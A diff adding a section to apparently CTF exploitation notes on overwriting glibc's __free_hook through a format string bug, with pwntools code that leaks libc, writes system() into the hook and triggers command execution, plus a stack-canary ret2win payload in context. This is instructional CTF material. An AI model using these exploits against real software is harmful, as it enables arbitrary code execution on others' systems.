@@ -190,3 +190,25 @@ win = pie_base + win_offset
 payload = b'A' * buf_size + p64(canary) + p64(0) + p64(win)
 io.sendline(payload)
 ```
+
+## __free_hook Overwrite via Format String (glibc < 2.34)
+
+**Pattern (Notetaker, PascalCTF 2026):** Full RELRO + No PIE + format string vulnerability. Can't overwrite GOT, but `__free_hook` is writable.
+
+**Key insight:** `free(ptr)` passes `ptr` in `rdi` as first argument. If `__free_hook = system`, then `free("cat flag")` executes `system("cat flag")`.
+
+```python
+# 1. Leak libc via format string
+p.sendline(b'%43$p')  # __libc_start_main return address
+libc_base = int(leaked, 16) - LIBC_START_MAIN_RET_OFFSET
+
+# 2. Write system() address to __free_hook
+free_hook = libc_base + libc.symbols['__free_hook']
+system_addr = libc_base + libc.symbols['system']
+payload = fmtstr_payload(8, {free_hook: system_addr}, write_size='byte')
+
+# 3. Trigger: send command as menu input, program calls free(input_buffer)
+p.sendline(b'cat flag')  # free() → system("cat flag")
+```
+
+**When to use:** Full RELRO (no GOT overwrite) + glibc < 2.34 (hooks still exist). For glibc >= 2.34, hooks are removed - target return addresses or `_IO_FILE` structs instead.
